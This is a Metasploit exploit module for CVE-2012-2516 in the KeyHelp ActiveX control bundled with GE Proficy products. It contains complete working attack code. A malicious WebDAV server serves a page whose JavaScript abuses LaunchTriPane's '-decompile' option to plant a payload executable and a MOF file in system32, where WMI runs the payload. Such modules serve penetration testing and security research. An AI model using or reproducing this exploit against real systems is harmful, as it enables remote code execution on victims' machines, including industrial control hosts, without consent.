##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec

  include Msf::Exploit::Remote::BrowserAutopwn
  autopwn_info({
    :os_name    => OperatingSystems::WINDOWS,
    :ua_name    => HttpClients::IE,
    :javascript => true,
    :rank       => NormalRanking,
    :classid    => "{45E66957-2932-432A-A156-31503DF0A681}",
    :method     => "LaunchTriPane",
  })

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'KeyHelp ActiveX LaunchTriPane Remote Code Execution Vulnerability',
      'Description'    => %q{
          This module exploits a code execution vulnerability in the KeyScript ActiveX
        control from keyhelp.ocx. It is packaged in several products or GE, such as
        Proficy Historian 4.5, 4.0, 3.5, and 3.1, Proficy HMI/SCADA 5.1 and 5.0, Proficy
        Pulse 1.0, Proficy Batch Execution 5.6, and SI7 I/O Driver between 7.20 and 7.42.
        When the control is installed with these products, the function "LaunchTriPane"
        will use ShellExecute to launch "hh.exe", with user controlled data as parameters.
        Because of this, the "-decompile" option can be abused to write arbitrary files on
        the remote system.

          Code execution can be achieved by first uploading the payload to the remote
        machine, and then upload another mof file, which enables Windows Management
        Instrumentation service to execute it. Please note that this module currently only
        works for Windows before Vista.

        On the other hand, the target host must have the WebClient service (WebDAV
        Mini-Redirector) enabled. It is enabled and automatically started by default on
        Windows XP SP3
      },
      'Author'         =>
        [
          'rgod <rgod[at]autistici.org>', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2012-2516' ],
          [ 'OSVDB', '83311' ],
          [ 'BID', '55265' ],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-169/' ],
          [ 'URL', 'http://support.ge-ip.com/support/index?page=kbchannel&id=S:KB14863' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Payload'        =>
        {
          'Space'           => 2048,
          'StackAdjustment' => -3500,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          #Windows before Vista because of the WBEM technique
          [ 'Automatic', { } ],
        ],
      'DisclosureDate' => 'Jun 26 2012',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptPort.new('SRVPORT', [ true, "The daemon port to listen on", 80 ]),
        OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
      ], self.class)
  end

  def on_new_session(client)
    print_status("The exe payload (C:\\windows\\system32\\msfmsf.exe) and mof file (C:\\windows\\system32\\wbem\\mof\\good\\msfmsf.mof) must be removed manually.")
  end

  def auto_target(cli, request)
    agent = request.headers['User-Agent']

    ret = nil
    # Check for MSIE and/or WebDAV redirector requests
    if agent =~ /(Windows NT 5\.1|MiniRedir\/5\.1)/
      ret = targets[0]
    elsif agent =~ /(Windows NT 5\.2|MiniRedir\/5\.2)/
      ret = targets[0]
    elsif agent =~ /MSIE/
      ret = targets[0]
    else
      print_error("Unknown User-Agent: #{agent}")
    end

    ret
  end


  def on_request_uri(cli, request)

    mytarget = target
    if target.name == 'Automatic'
      mytarget = auto_target(cli, request)
      if (not mytarget)
        send_not_found(cli)
        return
      end
    end

    # If there is no subdirectory in the request, we need to redirect.
    if (request.uri == '/') or not (request.uri =~ /\/[^\/]+\//)
      if (request.uri == '/')
        subdir = '/' + rand_text_alphanumeric(8+rand(8)) + '/'
      else
        subdir = request.uri + '/'
      end
      print_status("Request for \"#{request.uri}\" does not contain a sub-directory, redirecting to #{subdir} ...")
      send_redirect(cli, subdir)
      return
    end

    # dispatch WebDAV requests based on method first
    case request.method
    when 'OPTIONS'
      process_options(cli, request, mytarget)

    when 'PROPFIND'
      process_propfind(cli, request, mytarget)

    when 'GET'
      process_get(cli, request, mytarget)

    when 'PUT'
      print_status("Sending 404 for PUT #{request.uri} ...")
      send_not_found(cli)

    else
      print_error("Unexpected request method encountered: #{request.method}")

    end

  end


  #
  # GET requests
  #
  def process_get(cli, request, target)

    print_status("Responding to GET request #{request.uri}")
    # dispatch based on extension
    if (request.uri =~ /\.chm$/i)
      #
      # CHM requests sent by IE and the WebDav Mini-Redirector
      #
      if request.uri =~ /#{@var_exe_name}/
        print_status("Sending CHM with payload")
        send_response(cli, @chm_payload, { 'Content-Type' => 'application/octet-stream' })
      elsif request.uri =~ /#{@var_mof_name}/
        print_status("Sending CHM with mof")
        send_response(cli, @chm_mof, { 'Content-Type' => 'application/octet-stream' })
      else
        send_not_found(cli)
      end
    else
      #
      # HTML requests sent by IE and Firefox
      #
      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']
      path = request.uri.gsub(/\//, '\\\\\\')
      payload_unc = '\\\\\\\\' + my_host + path + @var_exe_name + '.chm'
      mof_unc = '\\\\\\\\' + my_host + path + @var_mof_name + '.chm'
      print_status("Using #{payload_unc} for payload...")
      print_status("Using #{mof_unc} for the mof file...")

      html = <<-HTML
      <html>
      <body>
      <script>
      KeyScript = new ActiveXObject("KeyHelp.KeyScript");

      ChmPayloadFile = "-decompile C:\\\\WINDOWS\\\\system32\\\\ #{payload_unc}";
      ChmMofFile = "-decompile c:\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\ #{mof_unc}";

      KeyScript.LaunchTriPane(ChmPayloadFile);
      setTimeout('KeyScript.LaunchTriPane(ChmMofFile);',3000);
      </script>
      </body>
      </html>
      HTML

      html.gsub!(/\t\t\t/, '')

      print_status("Sending HTML page")
      send_response(cli, html)

    end
  end


  #
  # OPTIONS requests sent by the WebDav Mini-Redirector
  #
  def process_options(cli, request, target)
    print_status("Responding to WebDAV OPTIONS request")
    headers = {
      #'DASL'   => '<DAV:sql>',
      #'DAV'    => '1, 2',
      'Allow'  => 'OPTIONS, GET, PROPFIND',
      'Public' => 'OPTIONS, GET, PROPFIND'
    }
    send_response(cli, '', headers)
  end


  #
  # PROPFIND requests sent by the WebDav Mini-Redirector
  #
  def process_propfind(cli, request, target)
    path = request.uri
    print_status("Received WebDAV PROPFIND request")
    body = ''

    if (path =~ /\.chm/i)
      print_status("Sending CHM multistatus for #{path} ...")
      body = %Q|<?xml version="1.0"?>
<a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:">
<a:response>
</a:response>
</a:multistatus>
|
    elsif (path =~ /\.manifest$/i) or (path =~ /\.config$/i) or (path =~ /\.exe/i)
      print_status("Sending 404 for #{path} ...")
      send_not_found(cli)
      return

    elsif (path =~ /\/$/) or (not path.sub('/', '').index('/'))
      # Response for anything else (generally just /)
      print_status("Sending directory multistatus for #{path} ...")
      body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|

    else
      print_status("Sending 404 for #{path} ...")
      send_not_found(cli)
      return

    end

    # send the response
    resp = create_response(207, "Multi-Status")
    resp.body = body
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end

  def generate_payload_chm(data)
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2012-2516", "template_payload.chm")
    fd = File.open(path, "rb")
    chm = fd.read(fd.stat.size)
    fd.close
    chm << data
    chm
  end

  def generate_mof_chm(data)
    path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2012-2516", "template_mof.chm")
    fd = File.open(path, "rb")
    chm = fd.read(fd.stat.size)
    fd.close
    chm << data
    chm
  end

  #
  # When exploit is called, generate the chm contents
  #
  def exploit
    if datastore['SRVPORT'].to_i != 80 || datastore['URIPATH'] != '/'
      fail_with(Exploit::Failure::Unknown, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')
    end

    @var_mof_name = rand_text_alpha(7)
    @var_exe_name = rand_text_alpha(7)
    payload_contents = generate_payload_exe
    mof_contents = generate_mof("msfmsf.mof", "msfmsf.exe")
    @chm_payload = generate_payload_chm(payload_contents)
    @chm_mof = generate_mof_chm(mof_contents)

    super
  end

end
